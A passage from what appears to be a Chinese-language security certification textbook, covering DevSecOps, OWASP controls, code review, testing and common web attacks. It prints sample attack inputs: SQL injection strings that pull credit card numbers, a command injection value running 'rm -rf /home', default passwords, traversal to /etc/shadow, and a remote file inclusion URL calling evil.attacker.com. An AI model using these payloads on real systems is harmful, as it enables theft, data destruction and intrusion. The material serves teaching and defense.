  \n当然，DevOps 也应将安全融入其中。术语 **DevSecOps** 将安全描述为 DevOps 模型的一部分。在该模型中，安全是整个开发和运维周期中共同承担的责任。这意味着将安全集成到设计、开发、测试以及生产应用程序和服务的运维工作中。\n\
  \n在 DevSecOps 模型中，安全从业者的角色包括威胁分析和沟通、规划、测试、提供反馈，当然还有持续改进和安全意识职责。要做到这一点，需要深入了解组织的风险承受能力，以及了解\
  \ DevSecOps 环境中其他参与者在做什么以及何时做。DevOps 和 DevSecOps 通常与持续集成和持续部署方法相结合，它们可以依赖自动化安全测试、集成安全工具（包括扫描、更新和配置管理工具）来帮助确保安全。\n\
  \n###### 持续集成和持续部署\n\n**持续集成**（**CI**）是一种开发实践，要求将代码持续、定期地签入共享代码库。在 CI 环境中，频率可以从每天几次到非常频繁的签入和自动化构建过程不等。这种方法的主要目标是启用自动化和脚本，以实施自动化的行动方案，从而实现代码的持续交付。\n\
  \n由于持续集成依赖自动化构建过程，因此也需要自动化测试。它也经常与**持续部署**（**CD**）（有时称为持续交付）配对使用，后者在测试通过后自动将测试过的变更推送到生产环境。\n\
  \n图 6.5 展示了持续集成/持续部署管道的视图。\n\n![图 6.5 CI/CD 管道](img/c06f005.png)\n\n**图 6.5** CI/CD\
  \ 管道\n\n使用持续集成和持续部署方法要求将**持续验证**和自动化安全测试构建到管道测试过程中。这可能导致新漏洞被部署到生产环境，并可能允许不受信任或恶意开发人员将缺陷插入已部署的代码中，然后在下一个周期的部移除该代码。这意味着日志记录、报告和**持续监控**都必须设计为适应\
  \ CI/CD 流程。\n\n#### 面向安全的设计与编码\n\n作为安全专业人员参与 SDLC，为提高应用程序安全性提供了重要机会。首次协助软件安全的机会出现在需求收集和设计阶段，此时安全可以作为需求的一部分内置其中，然后基于这些需求进行设计。随后，在开发过程中，安全编码技术、代码审查和测试可以提高所开发代码的质量和安全性。\n\
  \n在测试阶段，可以使用 Web 应用安全扫描器或渗透测试技术等工具对完全集成的软件进行测试。这还为持续的安全运营奠定了基础，通过为未来的安全扫描以及补丁和更新期间的回归测试建立基线。贯穿这些步骤，了解开发人员面临、制造和发现的常见安全问题会有所帮助。\n\
  \n#### 安全编码实践\n\n安全编码实践的最佳资源之一是开放 Web 应用安全项目（OWASP）。OWASP 是一个广泛的开发人员和安全从业者社区的家园，它托管了许多社区开发的标准、指南和最佳实践文档，以及大量开源工具。OWASP\
  \ 提供了定期更新的主动控制清单，不仅作为一套有用的最佳实践供审查，也作为了解 Web 应用安全威胁逐年变化的一种方式。\n\n以下是 OWASP 2018 年的顶级主动控制措施及其简要说明：\n\
  \n*   **定义安全需求** — 在整个开发过程中实施安全。\n*   **利用安全框架和库** — 预先存在的安全功能可以使保护应用程序更容易。\n* \
  \  **安全数据库访问** — 预构建 SQL 查询以防止注入，并为安全访问配置数据库。\n*   **编码和转义数据** — 移除特殊字符。\n*   **验证所有输入**\
  \ — 将用户输入视为不可信并进行适当过滤。\n\n\n\n\n\n##### OWASP 主动控制措施\n\n*   **实施数字身份**  使用多因素认证、安全的密码存储与恢复以及会话处理。\n\
  *   **强制执行访问控制**  要求所有请求都经过访问控制检查，默认拒绝，并应用最小权限原则。\n*   **保护无处不在的数据**  在传输中和静态时使用加密。\n\
  *   **实施安全日志记录和监控**  这有助于检测问题，并允许事后进行调查。\n*   **处理所有错误和异常**  错误不应提供敏感数据，且应测试应用程序以确保其能妥善处理问题。\n\
  \n您可以在 `www.owasp.org/index.php/OWASP_Proactive_Controls` 找到 OWASP 的主动控制措施列表，在 `www.owasp.org/index.php/OWASP_Secure_Coding_Practices_-_Quick_Reference:Guide`\
  \ 可获取一份有用的安全编码实践快速参考指南。\n\n##### API 安全\n\n*应用程序编程接口* (API) 是客户端与服务器之间，或应用程序与操作系统之间的接口，它们定义了客户端应如何向服务器请求信息以及服务器将如何响应。这一定义意味着用任何语言编写的程序都可以实现\
  \ API 并发起请求。\n\nAPI 对于构建系统间的接口非常有用，但如果未妥善保护，它们也可能成为脆弱点。API 安全依赖于认证、授权、适当的数据范围界定（以确保不会发布过多数据）、速率限制、输入过滤，以及适当的监控和日志记录来保持安全。当然，保护底层系统、配置\
  \ API 端点服务器或服务，以及提供正常的网络层安全性以保护服务也很重要。\n\n许多安全工具和服务器提供 API，安全专业人员通常需要编写脚本或程序来访问\
  \ API 以提取数据。\n\n#### 代码审查模型\n\n审查为应用程序编写的代码具有诸多优势。它有助于共享代码知识，且编写代码获得的经验优于单纯的文档，因为它提供了对代码及其功能的个人理解。它还有助于在开发周期中通过让代码接受审查来发现问题，同时强制执行编码最佳实践和标准。最后，它确保团队的多名成员知晓代码的预期功能及其实现方式。\n\
  \n存在许多常见的*代码审查*流程，包括正式和敏捷流程，如结对编程、过肩审查和 Fagan 代码审查。\n\n##### 结对编程\n\n*结对编程* 是一种敏捷软件开发技术，让两名开发人员共用一个工作站。一名开发人员编写代码，而另一名开发人员在编写过程中审查其代码。这旨在提供实时代码审查，并确保多名开发人员熟悉所编写的代码。在大多数结对编程环境中，开发人员需要频繁轮换角色，使他们都能花时间在键盘前思考代码，并在审查时思考设计及代码中存在的任何问题。\n\
  \n结对编程增加了开发成本，因为它需要两名全职开发人员。同时，它为代码的审查和分析提供了额外机会，并将更多经验直接应用于编码问题，从而有可能提高代码质量。\n\n\
  ##### 过肩审查\n\n*过肩代码审查* 同样依赖于一对开发人员，但它不要求持续的互动和交接，而是要求编写代码的开发人员向另一名开发人员解释代码。这种方法允许对代码进行同行评审，还能帮助开发人员理解代码如何工作，且没有结对编程相对较高的成本。\n\
  \n##### 传阅代码审查\n\n*传阅代码审查*，有时称为电子邮件传阅代码审查，是一种通过将完成的代码发送给审查人员来检查代码问题的手动同行评审形式。传阅审查可能涉及多名审查人员，允许具有不同专业知识和经验的审查人员做出贡献。虽然传阅审查在*发生时间*上比过肩审查更灵活，但它们不像过肩审查和结对编程那样提供从编写代码的开发人员那里轻松了解代码的机会，这使得文档变得更加重要。\n\
  \n##### 工具辅助审查\n\n*工具辅助代码审查* 依赖基于正式或非正式软件的工具来进行代码审查。Atlassian 的 Crucible 协作代码审查工具、Codacy\
  \ 的静态代码审查工具和 Phabricator 的 Differential 代码审查工具等，都是为了改进代码审查流程而设计的。用于代码审查的各种工具不仅反映了软件开发生命周期选项的多样性，也反映了组织如何建立其设计和审查流程。\n\
  \n##### 选择审查方法\n\n表 6.1 对比了四种非正式代码审查方法和正式代码审查。具体实现可能有所不同，但这些对比在各类代码审查之间通常成立。此外，每种方法背后的理论可能并不总是反映组织实际使用它的情况。例如，结对编程旨在提供与两名开发人员独立工作相同的开发速度，同时提高代码质量。这对于配合良好的经验丰富的程序员可能成立，但缺乏培训、个性差异和工作风格的变化可能会使结对编程的效果不如预期。\n\
  \n**表 6.1** 代码审查方法对比\n\n| 方法 | 成本 | 审查发生时间 | 解释代码的能力 | 所需技能 |\n| :--- | :--- | :---\
  \ | :--- | :--- |\n| **结对编程** | 中 | 实时 | 高 | 用户必须学习如何结对编程 |\n| **过肩审查** | 中 | 实时\
  \ | 高 | 无需额外技能 |\n| **传阅代码审查** | 低/中 | 异步 | 低 | 无需额外技能 |\n| **工具辅助审查** | 中 | 取决于工具/流程\
  \ | 通常较低 | 可能需要工具使用培训 |\n| **正式代码审查** | 高 | 异步 | 通常较低 | 代码审查流程培训 |\n\n当代码需要比传阅和过肩审查等相对轻量级的敏捷流程更深入的审查时，有时会使用正式代码审查流程。顾名思义，正式代码审查是一个深入、通常耗时的过程，旨在利用专家团队全面审查代码。正式代码审查的主要形式是\
  \ Fagan 检查。\n\n##### Fagan 检查\n\n*Fagan 检查* 是一种结构化的正式代码审查，旨在在开发过程中发现各种问题。Fagan 检查为流程指定了进入和退出标准，确保在执行适当的尽职调查之前不启动流程，并确保有已知的标准用于进入下一阶段。\n\
  \n图 6.6 所示的 Fagan 检查流程展示了典型流程的六个阶段：\n\n1.  **规划**，包括材料、与会人员和地点的准备\n2.  **概览**，通过审查材料和分配角色（如编码人员、阅读人员、审查人员和主持人）来准备团队\n\
  3.  **准备**，涉及审查被检查的代码或其他项目，并记录他们可能存在的任何问题或疑问\n4.  **会议**，根据准备阶段的记录识别缺陷\n\n\n\n\n\
  \n###### 5. 重构以解决问题\n\n###### 6. 版主跟进以确保所有已识别的问题均已发现，且在解决过程中未产生新缺陷\n\n![FIGURE 6.6\
  \ Fagan 代码审查](img/c06f006.png)\n\n**图 6.6** Fagan 代码审查\n\n#### 软件安全测试\n\n无论应用程序的开发团队多么优秀，代码中总会存在某种形式的缺陷。Veracode\
  \ 2019 年基于其测试得出的应用程序指标显示，他们扫描的应用程序中有 83% 在测试过程中至少表现出一个安全问题。这一数字表明，迫切需要将软件安全测试更好地集成到软件开发生命周期中。\n\
  \n安全专业人员和开发人员可使用各种各样的手动和自动测试工具及方法。幸运的是，自动化工具不断改进，提供了一种更简便的方式来验证代码的安全性。在接下来的几页中，我们将回顾当今可用的一些关键软件安全测试方法和工具。\n\
  \n##### 分析和测试代码\n\n作为每个应用程序和程序基础的源代码可能包含各种错误和缺陷，从编程和语法错误到业务逻辑、错误处理以及与其他服务和系统集成方面的问题。能够分析代码以了解代码的功能、执行任务的方式以及程序本身中可能出现缺陷的位置非常重要。这通常通过`静态`或`动态代码分析`以及`模糊测试`等测试方法来完成。一旦对代码进行更改并部署，必须进行`回归测试`，以确保修复措施没有产生新的安全问题！\n\
  \n###### 静态代码分析\n\n*静态代码分析*（有时称为源代码分析）是通过审查应用程序的代码来进行的。由于静态分析使用应用程序的源代码，因此它可以被视为一种`白盒测试`，测试人员拥有完全可见性。这使测试人员能够发现其他测试可能遗漏的问题，原因可能是逻辑未暴露给其他测试方法，或者是由于内部业务逻辑问题。\n\
  \n与许多其他方法不同，静态分析不运行程序；相反，它专注于理解程序是如何编写的以及代码旨在做什么。静态代码分析可以使用自动化工具进行，也可以通过人工审查代码来进行——这一过程有时称为“代码理解”。自动化静态代码分析在查找已知问题方面非常有效，而人工静态代码分析有助于识别程序员引入的错误。\n\
  \n###### 动态代码分析\n\n*动态代码分析*依赖于在提供输入以测试软件的同时执行代码。与静态代码分析非常相似，动态代码分析可以通过自动化工具或手动完成，但由于大多数动态代码测试过程中需要进行大量测试，因此强烈倾向于自动化测试。\n\
  \n###### 模糊测试\n\n*模糊测试*或*模糊测试*，涉及向应用程序发送无效或随机数据，以测试其处理意外数据的能力。系统会监控应用程序，以确定其是否崩溃、失败或以不正确的方式响应。由于模糊测试涉及大量数据，因此通常是自动化的，它对于检测输入验证和逻辑问题以及内存泄漏和错误处理特别有用。不幸的是，模糊测试往往只能识别简单的问题——它不考虑复杂的逻辑或业务流程问题，并且如果不监控其进度，可能无法提供完整的代码覆盖率。\n\
  \n#### 注入漏洞\n\n现在您已经很好地理解了安全代码开发和测试实践，让我们将注意力转向建立这些机制的动力：攻击者可能利用的漏洞，以破坏我们的安全。在本章中，我们将探讨许多不同的漏洞类别。\n\
  \n*注入漏洞*是攻击者用来突破 Web 应用程序并访问支持该应用程序的系统的主要机制之一。这些漏洞允许攻击者向 Web 应用程序提供某种类型的代码作为输入，并诱使\
  \ Web 服务器执行该代码或将其提供给另一台服务器执行。\n\n### SQL 注入攻击\n\nWeb 应用程序通常接收来自用户的输入，并使用它来构建数据库查询，将结果返回给用户。例如，考虑电子商务网站上的搜索功能。如果用户在搜索框中输入**橙色老虎枕头**，Web\
  \ 服务器需要知道目录中哪些产品可能与该搜索词匹配。它可能会向后端数据库服务器发送如下所示的请求：\n\n```\nSELECT ItemName, ItemDescription,\
  \ ItemPrice\nFROM Products\nWHERE ItemName LIKE '%orange%' AND\nItemName LIKE '%tiger%'\
  \ AND\nItemName LIKE '%pillow%'\n```\n\n此命令检索可包含在返回给最终用户的结果中的项目列表。在 SQL 注入攻击中，攻击者可能会向\
  \ Web 服务器发送一个看起来非常异常的请求，例如搜索：\n\n```\norange tiger pillow'; SELECT CustomerName,\
  \ CreditCardNumber FROM Orders; -- \n```\n\n如果 Web 服务器只是将此请求传递给数据库服务器，它将执行以下操作（为便于查看稍作重新格式化）：\n\
  \n```\nSELECT ItemName, ItemDescription, ItemPrice\nFROM Products\nWHERE ItemName\
  \ LIKE '%orange%' AND\nItemName LIKE '%tiger%' AND\nItemName LIKE '%pillow';\nSELECT\
  \ CustomerName, CreditCardNumber\nFROM Orders;\n--%'\n```\n\n如果成功，此命令将运行两个不同的 SQL\
  \ 查询（由分号分隔）。第一个将检索产品信息，第二个将检索客户姓名和信用卡号码的列表。\n\n在我们刚才描述的基本 SQL 注入攻击中，攻击者能够向 Web 应用程序提供输入，然后监控该应用程序的输出以查看结果。虽然这是攻击者的理想情况，但许多存在\
  \ SQL 注入缺陷的 Web 应用程序并不提供让攻击者直接查看攻击结果的方法。然而，这并不意味着攻击不可能；这只是使其更加困难。攻击者使用一种称为*盲目 SQL\
  \ 注入*的技术，即使无法直接查看结果也能实施攻击。我们将讨论两种形式的盲目 SQL 注入：基于内容和基于时间。\n\n###### 基于内容的盲目 SQL 注入\n\
  \n在基于内容的盲目 SQL 注入攻击中，攻击者向 Web 应用程序发送输入，在尝试实施攻击之前测试应用程序是否正在解释注入的代码。例如，考虑一个要求用户输入账户号码的\
  \ Web 应用程序。此 Web 页面的一个简单版本可能如图 6.7 所示。\n\n![FIGURE 6.7 账户号码输入页面](img/c06f007.png)\n\
  \n**图 6.7** 账户号码输入页面\n\n当用户在该页面输入账户号码时，接下来将看到与该账户关联的信息列表，如图 6.8 所示。\n\n![FIGURE\
  \ 6.8 账户信息页面](img/c06f008.png)\n\n**图 6.8** 账户信息页面\n\n支持此应用程序的 SQL 查询可能类似于以下内容：\n\
  \n```\nSELECT FirstName, LastName, Balance\nFROM Accounts\nWHERE AccountNumber =\
  \ '$account'\n```\n\n\n\n\n其中 `$account` 字段的值取自 图 6.7 中的输入字段。在此场景下，攻击者可以通过在账号字段中输入以下内容来测试标准的\
  \ SQL 注入漏洞：\n\n```\n52019' OR 1=1;--\n```\n\n如果成功，这将导致以下查询被发送到数据库：\n\n```\nSELECT\
  \ FirstName, LastName, Balance\nFROM Accounts\nWHERE AccountNumber = '52019' OR\
  \ 1=1\n```\n\n此查询将匹配所有结果。然而，Web 应用程序的设计可能会忽略第一行以外的任何查询结果。如果是这种情况，查询将显示与 图 6.8 所示相同的结果。尽管攻击者可能无法看到查询结果，但这并不意味着攻击失败。然而，由于对应用程序的可见性有限，很难区分防御完善的应用程序和成功的攻击。\n\
  \n攻击者可以通过使用已知会产生结果的输入来执行进一步测试，例如提供 图 6.8 中的账号 52019，并使用可修改该查询以返回*无*结果的 SQL 语句。例如，攻击者可以向该字段提供以下输入：\n\
  \n```\n52019' AND 1=2;--\n```\n\n如果 Web 应用程序容易受到盲目 SQL 注入攻击，它将向数据库发送以下查询：\n\n```\n\
  SELECT FirstName, LastName, Balance\nFROM Accounts\nWHERE AccountNumber = '52019'\
  \ AND 1=2\n```\n\n当然，此查询永远不会返回任何结果，因为 1 永远不等于 2！因此，Web 应用程序将返回一个无结果的页面，如 图 6.9 所示。如果攻击者看到此页面，他们可以合理地确定该应用程序容易受到盲目\
  \ SQL 注入攻击，随后便可尝试更多恶意查询，以篡改数据库内容或执行其他非预期操作。\n\n![图 6.9 盲目 SQL 注入后的账户信息页面](img/c06f009.png)\n\
  \n**图 6.9** 盲目 SQL 注入后的账户信息页面\n\n###### 基于时间的盲目 SQL 注入\n\n除了利用应用程序返回的内容来评估其对盲目 SQL\
  \ 注入攻击的易感性外，渗透测试人员还可以利用处理查询所需的时间作为从数据库检索信息的通道。\n\n这些攻击依赖于不同数据库平台提供的延迟机制。例如，Microsoft\
  \ SQL Server 的 Transact-SQL 允许用户指定如下命令：\n\n```\nWAITFOR DELAY '00:00:15'\n```\n\n\
  此命令将指示数据库在执行下一个操作前等待 15 秒。试图验证应用程序是否容易受到基于时间的攻击的攻击者，可能会向账户 ID 字段提供以下输入：\n\n```\n\
  52019'; WAITFOR DELAY '00:00:15'; --\n```\n\n立即返回 图 6.8 所示结果的应用程序，很可能不容易受到基于时间的攻击。然而，如果应用程序在\
  \ 15 秒延迟后返回结果，则很可能存在漏洞。\n\n这看起来可能像是一种奇怪的攻击，但它实际上可用于从数据库中提取信息。例如，假设前面示例中使用的 Accounts\
  \ 数据库表包含一个名为 `Password` 的未加密字段。攻击者可以使用基于时间的攻击，通过逐个字母检查来发现密码。\n\n执行基于时间的攻击的 SQL 语句有点复杂，考试不要求你掌握它。相反，这里有一些伪代码，从概念上说明该攻击的工作原理：\n\
  \n```\nFor each character in the password\n For each letter in the alphabet\n If\
  \ the current character is equal to the current letter, wait 15\n seconds before\
  \ returning results\n```\n\n通过这种方式，攻击者可以遍历所有可能的密码组合，逐个字符地推导出密码。这看起来可能很繁琐，但像 `SQLmap`\
  \ 和 `Metasploit` 这样的安全工具可以自动执行基于时间的盲目攻击，使其变得非常简单。\n\n##### 代码注入攻击\n\nSQL 注入攻击是一类被称为*代码注入*攻击的通用攻击的具体示例。这些攻击旨在将攻击者编写的代码插入到\
  \ Web 应用程序开发人员创建的合法代码中。任何将用户提供的输入插入到应用程序开发人员编写的代码中的环境，都可能容易受到代码注入攻击。\n\n类似的攻击也可能针对其他环境发生。例如，攻击者可能会在作为轻量级目录访问协议\
  \ (LDAP) 查询一部分发送的文本中嵌入命令，从而实施 *LDAP 注入攻击*。他们还可能试图在可扩展标记语言 (XML) 文档中嵌入代码，实施 *XML\
  \ 注入攻击*。命令甚至可能尝试加载包含恶意代码的动态链接库 (DLL)，实施 *DLL 注入攻击*。\n\n除了 SQL 注入，跨站脚本也是一种代码注入攻击的示例，它将攻击者编写的\
  \ HTML 代码插入到开发人员创建的网页中。我们将在本章后面详细讨论跨站脚本。\n\n##### 命令注入攻击\n\n在某些情况下，应用程序代码可能会回溯到操作系统以执行命令。这非常危险，因为攻击者可能利用应用程序中的缺陷，获得直接操纵操作系统的能力。例如，考虑\
  \ 图 6.10 中所示的简单应用程序。\n\n![图 6.10 账户创建页面](img/c06f010.png)\n\n**图 6.10** 账户创建页面\n\
  \n此应用程序为课程设置新的学生账户。除其他操作外，它会在服务器上为学生创建一个目录。在 Linux 系统上，应用程序可能会使用 `system()` 调用将目录创建命令发送到底层操作系统。例如，如果有人在文本框中填入\n\
  \n```\nmchapple\n```\n\n应用程序可能会使用函数调用\n\n```\nsystem('mkdir /home/students/mchapple')\n\
  ```\n\n为该用户创建主目录。审查此应用程序的攻击者可能会猜测这就是其工作原理，然后提供输入\n\n```\nmchapple & rm -rf /home\n\
  ```\n\n应用程序随后用它来创建系统调用：\n\n```\nsystem('mkdir /home/students/mchapple & rm -rf home')\n\
  ```\n\n这一系列命令将删除 `/home` 目录及其包含的所有文件和子文件夹。此命令中的 `&` 符号表示操作系统应将 `&` 符号后的文本作为单独的命令执行。这使得攻击者能够通过利用仅旨在执行\
  \ `mkdir` 命令的输入字段来执行 `rm` 命令。\n\n#### 利用身份认证漏洞\n\n应用程序与服务器、网络一样，依赖身份认证机制来确认用户和设备的身份，并验证它们是否被授权执行特定操作。攻击者经常试图破坏这些认证系统的安全性，因为如果他们能够做到这一点，就可能获得对受该认证基础设施保护的系统、服务和信息的非法访问。\n\
  \n##### 密码认证\n\n密码是当今最常用的认证形式，但遗憾的是，它们也是最容易被攻破的。原因在于密码是一种基于知识的认证技术。获知用户密码的攻击者，从那时起就可以冒充该用户，直到密码过期或被更改。\n\
  \n攻击者获知用户密码的途径有很多，范围涵盖技术手段到社交手段。以下只是攻击者可能发现用户密码的几种可能方式：\n\n\n\n\n##### 攻击向量\n\n\
  *   实施社会工程学攻击，诱使用户直接或通过虚假认证机制泄露密码\n*   窃听未加密的网络流量\n*   从先前被攻陷的站点获取密码转储，并假设大量用户在其他站点复用了该站点的密码\n\
  \n除了这些方法，攻击者还可能实施凭证暴力破解攻击，即从目标系统获取一组弱哈希密码，然后进行穷举搜索以破解这些密码并获取系统访问权限。\n\n在某些情况下，应用开发人员、供应商和系统管理员会让攻击者轻易得逞。系统通常带有默认管理员账户，且可能保持未修改状态。例如，图\
  \ 6.11 展示了 Zyxel 路由器手册的一部分，其中包含默认用户名和密码以及修改密码的说明。\n\n![FIGURE 6.11 Zyxel router\
  \ default password ¶ Source: www.zyxel.com/support/Zyxel-password-changing-procedure-20161213-v2.pdf](img/c06f011.png)\n\
  \n**图 6.11** Zyxel 路由器默认密码 ¶ 来源：`www.zyxel.com/support/Zyxel-password-changing-procedure-20161213-v2.pdf`\n\
  \n渗透测试人员可能假设管理员未修改默认密码，并尝试在应用程序和设备上使用各种默认密码以尝试获取访问权限。一些常见的用户名/密码组合测试如下：\n\n*   `administrator/password`\n\
  *   `admin/password`\n*   `admin/admin`\n\n许多网站维护着各类应用程序和设备使用的默认密码详细目录。这些网站是渗透测试人员寻求访问网络设备的绝佳切入点。\n\
  \n##### 会话攻击\n\n凭证窃取攻击允许黑客或渗透测试人员使用被盗账户直接向服务进行身份验证。*会话劫持* 攻击采取不同方法，通过窃取现有的已认证会话来实现。这些攻击不要求攻击者访问认证机制；相反，它们接管与网站已建立的认证会话。\n\
  \n大多数需要身份验证的网站使用用户浏览器中管理的 *Cookie*，并作为网站提供的 *HTTP 头* 信息的一部分进行传输。在这种方法中（如 图 6.12\
  \ 所示），用户访问网站的登录表单并使用其凭证进行身份验证。如果用户通过身份验证过程，网站会向用户的浏览器提供一个 Cookie，该 Cookie 可用于验证未来的请求。一旦用户在浏览器中存储了有效的\
  \ Cookie，浏览器就会将该 Cookie 随发往该网站的所有未来请求一起传输。网站检查 Cookie，确定用户已通过身份验证，无需重新输入密码或完成其他身份验证任务。\n\
  \n![FIGURE 6.12 Session authentication with cookies](img/c06f012.png)\n\n**图 6.12**\
  \ 使用 Cookie 进行会话认证\n\nCookie 只是用户浏览器中维护的一个存储对象，它保存稍后可由创建它们的网站访问的变量。你可以将 Cookie 视为网站在用户浏览器中维护的一个小型信息数据库。Cookie\
  \ 包含一个认证字符串，将 Cookie 与特定的用户会话关联。图 6.13 展示了 `CNN.com` 网站使用的一个 Cookie 示例，在 Chrome\
  \ 浏览器中查看。如果你检查自己浏览器的 Cookie 缓存内容，可能会发现数百或数千个由你访问过的网站维护的 Cookie。有些 Cookie 可能已有数年历史。\n\
  \n![FIGURE 6.13 Session cookie from CNN.com](img/c06f013.png)\n\n**图 6.13** 来自 `CNN.com`\
  \ 的会话 Cookie\n\n###### Cookie 窃取与篡改\n\n正如你所读到的，Cookie 作为绕过网站认证机制的关键。打个比方，想象一下参加一个行业会议。当你到达注册台时，可能会被要求提供带照片的身份证件并支付注册费。在这种情况下，你经历了一个认证过程。注册后，工作人员会给你一个挂在脖子上的胸牌，供你在展会剩余时间佩戴。从那时起，任何安保人员只需瞥一眼你的胸牌，就知道你已经过认证并获得了进入展会的权限。如果有人偷走了你的胸牌，他们现在就拥有了你享有的同等展会访问权限。\n\
  \nCookie 的工作原理相同。它们只是胸牌的数字化版本。如果攻击者能够窃取某人的 Cookie，他们随后就可以向颁发该 Cookie 的网站冒充该用户。攻击者可能通过以下几种方式获取\
  \ Cookie：\n\n*   窃听未加密的网络连接，并在 Cookie 在用户和网站之间传输时窃取副本。\n*   在用户的浏览器上安装恶意软件，检索 Cookie\
  \ 并将其传回攻击者。\n*   实施 *中间人攻击*，攻击者欺骗用户认为攻击者实际上是目标网站，并呈现一个虚假的认证表单。随后，他们可能代表用户向网站进行身份验证并获取\
  \ Cookie。\n\n一旦攻击者拥有了 Cookie，他们可能会执行 Cookie 篡改以更改发回网站的详细信息，或者直接将 Cookie 作为获取网站访问权限所需的“胸牌”。这被称为\
  \ *会话重放* 攻击，如 图 6.14 所示。\n\n![FIGURE 6.14 Session replay](img/c06f014.png)\n\n**图\
  \ 6.14** 会话重放\n\nWeb 开发人员可以通过使用 `SECURE` 属性标记 Cookie 来防止 Cookie 窃取。*安全 Cookie* 永远不会通过未加密的\
  \ HTTP 连接传输。服务器和 Web 浏览器都理解它们必须仅通过加密通道发送，以防范会话重放攻击。\n\nNTLM *传递哈希攻击* 是另一种重放攻击形式，它针对操作系统而非\
  \ Web 应用程序。攻击者首先访问 Windows 系统，然后从该系统收集存储的 NTLM 密码哈希。随后，他们可以尝试使用这些哈希来获取该系统或同一 Active\
  \ Directory 域中其他系统的用户或管理员访问权限。\n\n###### 未验证的重定向\n\n不安全的 URL 重定向是攻击者可能利用的另一种漏洞，旨在窃取用户会话。某些\
  \ Web 应用程序允许浏览器将目标 URL 传递给应用程序，并在交易完成时将用户重定向到该 URL。例如，订单页面可能使用如下结构的 URL：\n\n```\n\
  https://www.mycompany.com/ordering.php?redirect=http%3a//www.mycompany.com/thankyou.htm\n\
  ```\n\nWeb 应用程序随后会在交易结束时将用户发送到感谢页面。这种方法对 Web 开发人员很方便，因为它允许管理员在不更改应用程序代码的情况下修改目标页面。然而，如果应用程序允许重定向到任意\
  \ URL，就会产生 *未验证的重定向* 情况，攻击者可利用它将用户重定向到恶意站点。例如，攻击者可能在留言板上发布指向上述页面的链接，但将 URL 修改为：\n\
  \n```\nhttps://www.mycompany.com/ordering.php?redirect=http%3a//www.evilhacker.com/passwordstealer.htm\n\
  ```\n\n\n\n\n用户访问此链接会在 `mycompany.com` 网站上完成合法交易，但随后会被重定向到攻击者的页面，其中的代码可能会将用户直接引入会话窃取或凭证盗窃攻击。\n\
  \n寻求在其应用程序中包含重定向选项的开发人员应执行*验证过的重定向*，即根据批准列表检查重定向 URL。此列表可能指定授权重定向的确切 URL，或者更简单地说，它可能仅将重定向限制为来自同一域的\
  \ URL。\n\n#### 利用授权漏洞\n\n我们已经探讨了允许攻击者向后端系统发送代码的注入漏洞，以及允许攻击者假冒合法用户身份的身份验证漏洞。现在让我们看看一些授权漏洞，它们允许攻击者超出其被授权的访问级别。\n\
  \n##### 不安全的直接对象引用\n\n在某些情况下，Web 开发人员设计应用程序时，会根据用户在查询字符串或 `POST` 请求中提供的参数，直接从数据库检索信息。例如，此查询字符串可用于从文档管理系统检索文档：\n\
  \n```\nhttps://www.mycompany.com/getDocument.php?documentID=1842\n```\n\n只要应用程序还实现了其他授权机制，这种方法本身没有任何问题。应用程序仍有责任确保用户经过适当身份验证，并被授权访问请求的文档。\n\
  \n原因在于攻击者可以轻松查看此 URL，然后对其进行修改，以尝试检索其他文档，例如：\n\n```\nhttps://www.mycompany.com/getDocument.php?documentID=1841\n\
  https://www.mycompany.com/getDocument.php?documentID=1843\nhttps://www.mycompany.com/getDocument.php?documentID=1844\n\
  ```\n\n如果应用程序不执行授权检查，用户可能会被允许查看超出其权限的信息。这种情况称为*不安全的直接对象引用*。\n\n##### 目录遍历\n\n某些\
  \ Web 服务器存在安全配置错误，允许用户浏览目录结构并访问本应保持安全的文件。当 Web 服务器允许包含浏览目录路径的操作符，且文件系统访问控制未能正确限制对存储在服务器其他位置的文件的访问时，这些*目录遍历*攻击就会生效。\n\
  \n例如，考虑一个将 Web 内容存储在目录路径 `/var/www/html/` 中的 Apache Web 服务器。同一台服务器可能将包含哈希用户密码的 shadow\
  \ 密码文件存储在 `/etc` 目录中，文件名为 `/etc/shadow`。这两个位置通过相同的目录结构链接，如图 6.15 所示。\n\n![图 6.15\
  \ Web 服务器目录结构示例](img/c06f015.png)\n\n**图 6.15** Web 服务器目录结构示例\n\n如果 Apache 服务器使用\
  \ `/var/www/html/` 作为网站的根位置，则这是所有文件的假定路径，除非另有指定。例如，如果站点是 `www.mycompany.com`，则 URL\
  \ `www.mycompany.com/account.php` 将引用存储在服务器上的文件 `/var/www/html/account.php`。\n\n\
  在 Linux 操作系统中，文件路径中的 `..` 操作符指代比当前目录高一级的目录。例如，路径 `/var/www/html/../` 指代比 `html`\
  \ 目录高一级的目录，即 `/var/www/`。\n\n目录遍历攻击利用此知识，尝试导航到 Web 服务器保留区域之外的文件系统区域。例如，目录遍历攻击可能尝试通过输入此\
  \ URL 来访问 shadow 密码文件：\n\n```\nhttp://www.mycompany.com/../../../etc/shadow\n```\n\
  \n如果攻击成功，Web 服务器将忠实地在攻击者的浏览器中显示 shadow 密码文件，为针对凭证的暴力破解攻击提供起点。攻击 URL 使用 `..` 操作符三次以向上导航目录层次结构。如果您参考图\
  \ 6.15 并以 `/var/www/html` 目录作为起点，第一个 `..` 操作符将您带到 `/var/www`，第二个带到 `/var`，第三个带到根目录\
  \ `/`。URL 的其余部分将您带入 `/etc/` 目录并到达 `/etc/shadow` 文件的位置。\n\n##### 文件包含\n\n*文件包含攻击*将目录遍历提升到了一个新的层次。文件包含攻击不仅仅是从本地操作系统检索文件并将其显示给攻击者，而是实际执行文件中包含的代码，从而欺骗\
  \ Web 服务器执行任意代码。\n\n文件包含攻击有两种变体：\n\n*   *本地文件包含*攻击旨在执行位于 Web 服务器其他位置的文件中存储的代码。它们的工作方式与目录遍历攻击非常相似。例如，攻击者可能使用以下\
  \ URL 来执行存储在 Windows 服务器 `C:\\www\\uploads` 目录中名为 `attack.exe` 的文件：\n\n    ```\n\
  \    http://www.mycompany.com/app.php?include=C:\\\\www\\\\uploads\\\\attack.exe\n\
  \    ```\n\n*   *远程文件包含*攻击允许攻击者更进一步，执行存储在远程服务器上的代码。这些攻击特别危险，因为攻击者可以直接控制所执行的代码，而无需先在本地服务器上存储文件。例如，攻击者可能使用此\
  \ URL 来执行存储在远程服务器上的攻击文件：\n\n    ```\n    http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe\n\
  \    ```\n\n当攻击者发现文件包含漏洞时，他们通常会利用它将 *Web Shell* 上传到服务器。Web Shell 允许攻击者在服务器上执行命令并在浏览器中查看结果。这种方法通过常用的\
